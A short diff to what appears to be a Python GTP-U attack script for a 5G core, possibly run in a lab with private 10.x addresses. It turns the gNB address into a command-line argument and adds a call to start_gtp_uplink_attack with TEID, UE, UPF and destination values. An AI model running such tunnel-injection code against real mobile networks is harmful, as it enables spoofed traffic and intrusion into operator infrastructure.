@@ -15,7 +15,8 @@ TEID = int(sys.argv[1], 0)
 SRC_ADDR = "10.100.200.66"
 DST_ADDR = sys.argv[3]
 UE_ADDR = sys.argv[2]
-GNB_ADDR = "10.100.200.14"
+# GNB_ADDR = "10.100.200.14"
+GNB_ADDR = sys.argv[4]
 UPF_ADDR = "10.100.200.2"
 DPORT = 2152
 
@@ -62,3 +63,13 @@ def start_gtp_uplink_attack(
 
     send(packet)
     print("[+]  Packet sent successfully")
+
+
+start_gtp_uplink_attack(
+    gnb_addr=GNB_ADDR,
+    upf_addr=UPF_ADDR,
+    teid=TEID,
+    ue_addr=UE_ADDR,
+    dst_addr=DST_ADDR,
+    upf_dport=DPORT,
+)
